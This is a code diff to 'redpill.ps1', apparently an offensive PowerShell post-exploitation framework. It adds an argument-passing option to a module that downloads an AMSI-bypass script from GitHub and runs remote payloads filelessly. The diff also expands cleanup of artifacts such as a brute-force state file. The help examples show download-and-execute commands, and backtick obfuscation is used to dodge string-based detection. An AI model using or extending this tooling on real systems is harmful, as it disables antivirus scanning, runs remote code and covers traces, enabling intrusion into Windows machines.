@@ -110,6 +110,7 @@
    [string]$IconSet="False",
    [string]$Sponsor="false",
    [string]$NoAmsi="false",
+   [string]$PSargs="false",
    [string]$UacMe="false",
    [string]$Verb="false",
    [string]$Port="false",
@@ -3241,7 +3242,7 @@ If($NoAmsi -ne "false"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/NoAmsi.ps1 -Destination $Env:TMP\NoAmsi.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\NoAmsi.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 40){## Corrupted download detected => DefaultFileSize: 40,5068359375/KB
+      If($SizeDump -lt 41){## Corrupted download detected => DefaultFileSize: 41,609375/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\NoAmsi.ps1"){Remove-Item -Path "$Env:TMP\NoAmsi.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -3250,6 +3251,8 @@ If($NoAmsi -ne "false"){
 
    ## replace global variable on NoAmsi.ps1
    ((Get-Content -Path "$Env:TMP\NoAmsi.ps1" -Raw) -Replace "viriato='0'","viriato='1'")|Set-Content -Path "$Env:TMP\NoAmsi.ps1" -Force
+   ## Append @arguments to downloaded cmdlet
+   If($PSargs -ne "false"){((Get-Content -Path "$Env:TMP\NoAmsi.ps1" -Raw) -Replace "#<INPUT_CMDLET_ARGUMENT_LIST>","$PSargs")|Set-Content -Path "$Env:TMP\NoAmsi.ps1" -Force}
 
    ## Run auxiliary module
    If($NoAmsi -ieq "List")
@@ -3284,6 +3287,7 @@ If($NoAmsi -ne "false"){
 
    ## Clean Artifacts left behind
    If(Test-Path -Path "$Env:TMP\NoAmsi.ps1"){Remove-Item -Path "$Env:TMP\NoAmsi.ps1" -Force}
+   If(Test-Path -Path "$pwd\localbrute.state"){Remove-Item -Path "$pwd\localbrute.state" -Force}
 }
 
 
@@ -5205,6 +5209,9 @@ $HelpParameters = @"
    .Parameter PayloadURL
       The URL script.ps1 to be downloaded\executed! (default: false)
 
+   .Parameter PSargs
+      The cmdlet to be downloaded\exec argument list (default: false)
+
    .EXAMPLE
       PS C:\> .\redpill.ps1 -NoAmsi List
       List ALL cmdlet Am`si_bypasses available!
@@ -5221,6 +5228,10 @@ $HelpParameters = @"
       PS C:\> .\redpill.ps1 -NoAmsi bypass -PayloadURL "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/GetSkype.ps1"
       Download\Execute 'GetSkype.ps1' (FileLess) trougth Ams1_bypass technic nº2 (cmdlet default technic)
 
+   .EXAMPLE
+      PS C:\> .\redpill.ps1 -NoAmsi bypass -PayloadURL "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/sysinfo.ps1" -PSargs "-sysinfo enum"
+      Download\Execute 'sysinfo.ps1' with arguments (FileLess) trougth Ams1_bypass technic nº2 (cmdlet default technic)
+
    .OUTPUTS
       Testing am`si_bypass technics
       ----------------------------
@@ -5236,7 +5247,7 @@ $HelpParameters = @"
       Disclosure  : @mattifestation
       Description : DL`L_REFLEC`TION
       POC         : ----
-      Remark      : string detection bypassed!
+      Remark      : string detection disabled!
    #>!bye..
 
 "@;
